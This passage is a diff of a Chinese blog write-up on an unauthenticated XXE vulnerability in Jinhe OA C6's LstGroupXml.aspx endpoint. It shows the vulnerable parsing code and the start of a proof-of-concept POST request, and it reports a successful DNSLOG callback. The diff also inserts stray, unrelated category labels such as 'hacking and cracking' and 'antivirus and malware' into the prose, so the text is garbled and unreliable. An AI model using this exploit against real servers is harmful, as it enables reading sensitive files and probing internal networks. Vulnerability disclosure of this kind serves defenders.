@@ -6,9 +6,9 @@ asset_dir: embedded-base64
 
 # 漏洞简介
 
-金和网络是专业信息化服务商,为城市监管部门提供了[互联网](#)+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `LstGroupXml.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。
+金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `LstGroupXml.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。
 
-商业服务
+黑客与破解
 
 # 影响版本
 
@@ -30,13 +30,21 @@ protected void Page_Load(object sender, EventArgs e)
   xmlDocument.LoadXml(end);
 ```
 
+深入探索
+
+数据管理
+
+脚本语言
+
+博客资源与服务
+
 请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
 # 漏洞复现
 
 > 另一个 JHSoft.Web.govsetaip/LstGroupXml.aspx 接口也存在同样的漏洞
 >
-> 编程
+> 参考信息
 
 ```
 POST /c6/Jhsoft.Web.groups/LstGroupXml.aspx/ HTTP/1.1
@@ -51,11 +59,11 @@ Host: jhsoft.mrxn.net
 
 深入探索
 
+字典与百科全书
+
+防病毒程序与恶意软件
+
 计算机科学
-
-工厂自动化
-
-脚本语言
 
 在DNSLOG平台成功收到请求
 
